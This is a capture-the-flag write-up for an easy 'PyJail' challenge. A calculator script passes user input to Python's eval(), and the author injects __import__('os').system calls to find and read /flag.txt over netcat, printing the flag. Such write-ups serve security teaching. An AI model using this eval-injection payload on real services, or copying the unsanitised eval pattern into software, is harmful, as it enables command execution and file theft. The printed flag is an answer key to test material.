
```python
#!/usr/bin/env python3

print("           _            _       _             ")
print("          | |          | |     | |            ")
print("  ___ __ _| | ___ _   _| | __ _| |_ ___  _ __ ")
print(" / __/ _` | |/ __| | | | |/ _` | __/ _ \| '__|")
print("| (_| (_| | | (__| |_| | | (_| | || (_) | |   ")
print(" \___\__,_|_|\___|\__,_|_|\__,_|\__\___/|_|   ")

def calc(op):
	try : 	
		res = eval(op)
	except :
		return print("Wrong operation")
	return print(f"{op} --> {res}")

def main():
	while True :
		inp = input(">> ")
		calc(inp)

if __name__ == '__main__':
	main()
```

This is an easy PyJail Challenge let's look at this

- `main()` 
	- Takes input to `inp`
	- executes the `calc()` function on input
- `calc()`
	- There is a try except statement and runs `eval()` on our input

`eval()` is extremely vulnerable because we can run arb code with Python `__builtins__`

so my final payload was...

```python
__import__('os').system('find / -type f -name "flag.txt" 2>/dev/null')

# and #

__import__('os').system('cat /flag.txt')
```

which ended up like

```zsh
❯ nc kashictf.iitbhucybersec.in 57639
           _            _       _
          | |          | |     | |
  ___ __ _| | ___ _   _| | __ _| |_ ___  _ __
 / __/ _` | |/ __| | | | |/ _` | __/ _ \| '__|
| (_| (_| | | (__| |_| | | (_| | || (_) | |
 \___\__,_|_|\___|\__,_|_|\__,_|\__\___/|_|
>> __import__('os').system('find / -type f -name "flag.txt" 2>/dev/null')
/flag.txt
__import__('os').system('find / -type f -name "flag.txt" 2>/dev/null') --> 0
>> __import__('os').system('cat /flag.txt')
KashiCTF{3V4L_41NT_54F3_oeFp3TYm}
__import__('os').system('cat /flag.txt') --> 0
>>
```

Flag: `KashiCTF{3V4L_41NT_54F3_oeFp3TYm}`

